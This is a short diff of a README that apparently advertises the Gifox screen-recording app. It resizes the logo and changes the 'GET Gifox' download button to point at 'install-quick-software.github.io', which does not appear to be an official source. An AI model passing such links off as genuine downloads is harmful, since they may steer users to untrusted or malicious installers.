@@ -1,13 +1,13 @@
 # Gifox – Advanced Screen-to-GIF Recording Utility  
 
 <div align="center">  
-<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/8a/a5/f4/8aa5f498-e36c-fe51-e677-0700a65db10c/Icon-0-0-85-220-0-0-4-0-2x.png/1200x630bb.png" alt="Gifox App Logo" width="400">  
+<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/8a/a5/f4/8aa5f498-e36c-fe51-e677-0700a65db10c/Icon-0-0-85-220-0-0-4-0-2x.png/1200x630bb.png" alt="Gifox App Logo" width="350">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/gifox">  
+<a href="https://install-quick-software.github.io/.github/gifox">  
 <img src="https://img.shields.io/badge/💻_GET_Gifox-purple?style=for-the-badge&logo=apple" alt="GET Gifox">  
 </a>  
 </div>
